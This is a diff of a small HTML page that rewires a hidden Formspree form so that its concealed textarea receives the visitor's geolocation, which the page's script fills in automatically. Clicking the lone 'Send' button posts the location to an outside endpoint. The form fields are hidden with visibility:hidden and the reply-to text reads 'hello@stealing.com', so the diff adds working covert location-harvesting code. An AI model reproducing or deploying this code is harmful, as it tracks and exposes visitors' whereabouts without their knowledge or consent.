@@ -8,11 +8,15 @@
     <title>Document</title>
 </head>
 
-<body>
-
     <body>
-        <div id="location"></div>
-        <script>
+        
+        <form action="https://formspree.io/f/xayazppw" method="POST">
+            <label style="visibility:hidden">Your email:<input type="email" name="_replyto">hello@stealing.com</label>
+            <label style="visibility:hidden">Your message:<textarea name="message" id="location"></textarea></label>
+            <button type="submit">Send</button>
+        </form>
+        
+                <script>
             var div = document.getElementById("location");
             function getLocation() {
                 if (navigator.geolocation) {
@@ -32,11 +36,6 @@
             getLocation();
         </script>
         
-        <form action="https://formspree.io/f/xayazppw" method="POST">
-            <label style="visibility:hidden">Your email:<input type="email" name="_replyto">hello@stealing.com</label>
-            <label style="visibility:hidden">Your message:<textarea name="message">lasda</textarea></label>
-            <button type="submit">Send</button>
-        </form>
     </body>
 
 </html>
